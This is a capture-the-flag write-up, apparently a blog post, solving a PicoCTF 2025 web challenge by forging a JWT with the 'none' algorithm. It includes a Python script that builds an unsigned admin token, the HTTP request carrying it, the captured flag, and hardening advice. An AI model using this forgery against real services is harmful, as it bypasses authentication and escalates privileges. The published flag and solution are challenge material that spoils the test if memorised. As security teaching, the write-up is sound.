+++
title = "JWT None Algorithm Attack"
date = "2025-01-15"
description = "Forging JWT tokens by exploiting the none algorithm vulnerability to escalate privileges."
tags = ["jwt", "web", "authentication", "crypto"]
categories = ["web"]
difficulty = "easy"
category = "Web"
points = "100"
ctf_name = "PicoCTF 2025"
challenge_author = "webmaster"
solves = "312"
+++

## Challenge Description

A web application uses JWT for session management. We start as a regular user and need to access the admin endpoint at `/api/admin/flag`.

## Reconnaissance

After registering and logging in, we receive a JWT cookie:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwNTI5MDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Decoding the payload:

```json
{
  "user": "guest",
  "role": "user",
  "iat": 1705290000
}
```

Accessing `/api/admin/flag` returns `403 Forbidden: Admin role required`.

## Analysis

The JWT header specifies `HS256`:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

A common vulnerability is that some JWT libraries accept `"alg": "none"` as a valid algorithm, which means the token requires no signature verification. If the server-side library does not explicitly reject the `none` algorithm, we can forge arbitrary tokens.

## Exploitation

### Step 1: Craft a Forged Token

Modify the header to use `none` algorithm and change the role to `admin`:

```python
import base64
import json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url_encode(json.dumps({
    "alg": "none",
    "typ": "JWT"
}).encode())

payload = b64url_encode(json.dumps({
    "user": "guest",
    "role": "admin",
    "iat": 1705290000
}).encode())

# No signature needed with "none" algorithm
forged_token = f"{header}.{payload}."
print(forged_token)
```

### Step 2: Send the Forged Token

```
GET /api/admin/flag HTTP/1.1
Host: challenge.picoctf.org
Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDUyOTAwMDB9.
```

Response:

```json
{
  "flag": "FLAG{jwt_n0n3_4lg0_1s_d4ng3r0us}"
}
```

## Flag

<div class="flag-box">FLAG{jwt_n0n3_4lg0_1s_d4ng3r0us}</div>

## Takeaways

- Always explicitly whitelist allowed JWT algorithms on the server side
- The `none` algorithm should be rejected in production environments
- Use libraries that are not vulnerable to algorithm confusion attacks
- Consider using asymmetric algorithms (RS256) for added security
